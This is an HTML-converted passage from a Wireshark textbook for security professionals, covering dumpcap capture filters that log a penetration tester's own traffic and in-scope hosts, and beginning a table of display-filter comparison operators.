style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Lines 4 through 7 do the same as lines 0 through 3 but for the destination address.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.6667px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker48260.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Lines 8 and 9 are instructions to return.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You can use this method of analyzing the filter step by step to verify where the filter is going wrong.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.7500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Capture Filters for Pentesting</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:8.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We suspect you already know this, but we&#8217;ll add this, just in case: &#8220;Pentesting&#8221; is short for penetration testing, the art of testing a computer, network, or application to search for vulnerabilities. Any pentesters reading this book are familiar with the concept that you</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >end up getting blamed for every problem that happens on the network even if you aren&#8217;t connected to it at the time. As such capturing data on a pentest is helpful when you need to prove to upset clients that</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >you genuinely had nothing to do with the switch dying or a business- critical SCADA system exploding. It is also helpful when you need to review your packet captures for general information gathering or post- test analysis and</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >reporting.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The following snippet would capture all your outgoing traffic to</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >serve as a logbook for your actions on the network. It captures only traffic coming from your network card identified by the MAC address and saves it split up in multiple time-stamped files prefixed by</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >pentest</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="line-height:16.8500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Notice that Dumpcap was used here instead of the GUI or</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >TShark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.2500pt;margin-right:0.0000pt;margin-left:22.3500pt;text-indent:-14.4000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >dumpcap -f "ether src host 00:0c:29:57:b3:ff" -w pentest -b filesize:10000</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You can run this snippet in the background, as running an entire instance of Wireshark would tie up too much of the system resources.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Saving only the outgoing traffic is not much use for pentest analysis.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section33" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To capture all traffic going to and from your testing machine combined with broadcast traffic, use the following snippet:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >dumpcap -f "ether host 00:0c:29:57:b3:ff or broadcast" -w pentest</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-b</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:22.3500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >filesize:10000</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  align=justify  style="margin-right:30.2000pt;text-align:justify;text-justify:inter-ideograph;" ><a name="_bookmark35" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As you can see, only the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >src</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.3000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >directive was dropped, and a broadcast expression was combined with the Ethernet expression using the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >or </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >statement.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The following pentesting snippet can also be used to capture traffic to and from a list of IP addresses, such as all the IPs that are in scope for your pentest. This applies to cases where you are using multiple virtual machines and thus MAC addresses, but you want to be able to log all relevant traffic.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.2000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >dumpcap -f "ip host 192.168.0.1 or ip host 192.168.0.5"</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  align=justify  style="margin-right:32.3500pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The list of hosts could get a little large to type by hand, so it is</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >more practical to store your in-scope targets in a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >hosts.txt</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >file and use it instead. To generate the filter itself, use the following one-liner</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and strip the last</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >or</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.5500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >cat hosts.txt | xargs -I% echo -n "ip host % or "</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Display Filters</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To get started with display filters, we begin with a brief explanation of the syntax and available operators, followed by a walkthrough of a typical use that should get you up to speed in no time.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The display filter syntax is based on expressions returning </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >true </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >or </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >false </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >by using operators for comparison. This can be combined with Boolean logic operators to combine several expressions so that you can really drill down your results. See<a name="_bookmark36" ></a>&nbsp;</span><span><a href="#_bookmark37" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Table 1-1</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >for the most common comparison operators.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:10.9000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark37" ></a><span><a href="#_bookmark36" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Table 1-1:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Comparison Operators</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><table class=MsoNormalTable  border=1  cellspacing=0  style="border-collapse:collapse;width:467.2500pt;margin-left:14.4000pt;mso-table-layout-alt:fixed;border:none;mso-border-left-alt:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);mso-border-insideh:1.0000pt solid rgb(191,191,191);mso-border-insidev:1.0000pt solid rgb(191,191,191);mso-padding-alt:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;" ><tr style="height:38.7500pt;" ><td width=136  valign=top  style="width:81.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" >ENGLISH</span></b><b><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></p></td><td width=100  valign=top  style="width:60.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;margin-right:15.5000pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" >C- LIKE</span></b><b><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></p></td><td width=542  valign=top  style="width:325.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" >DESCRIPTION</span></b><b><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></p></td></tr></table></div>
<span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section34" ><table class=MsoNormalTable  border=1  cellspacing=0  style="border-collapse:collapse;width:467.2500pt;margin-left:14.4000pt;mso-table-layout-alt:fixed;border:none;mso-border-left-alt:0.7500pt solid rgb(191,191,191);mso-border-top-alt:0.7500pt solid rgb(191,191,191);mso-border-right-alt:0.7500pt solid rgb(191,191,191);mso-border-bottom-alt:0.7500pt solid rgb(191,191,191);mso-border-insideh:0.7500pt solid rgb(191,191,191);mso-border-insidev:0.7500pt solid rgb(191,191,191);mso-padding-alt:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;" ><tr style="height:19.3500pt;" ><td width=136  valign=top  style="width:81.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:0.7500pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-left:2.6000pt;line-height:16.6500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >eq</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=100  valign=top  style="width:60.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:3.1000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >==</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=542  valign=top  style="width:325.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:3.1000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >Equal</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=136  valign=top  style="width:81.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >ne</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=100  valign=top  style="width:60.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:5.2500pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >!=</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=542  valign=top  style="width:325.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Not equal</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=136  valign=top  style="width:81.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >gt</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=100  valign=top  style="width:60.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:5.2500pt;" ><span style="font-family:'Courier New';font-size:12.0000pt;" >&#62;</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=542  valign=top  style="width:325.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Greater than</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=136  valign=top  style="width:81.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >lt</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=100  valign=top  style="width:60.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:5.2500pt;" ><span style="font-family:'Courier New';font-size:12.0000pt;" >&#60;</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=542  valign=top  style="width:325.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Less than</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:21.5000pt;" ><td width=136  valign=top  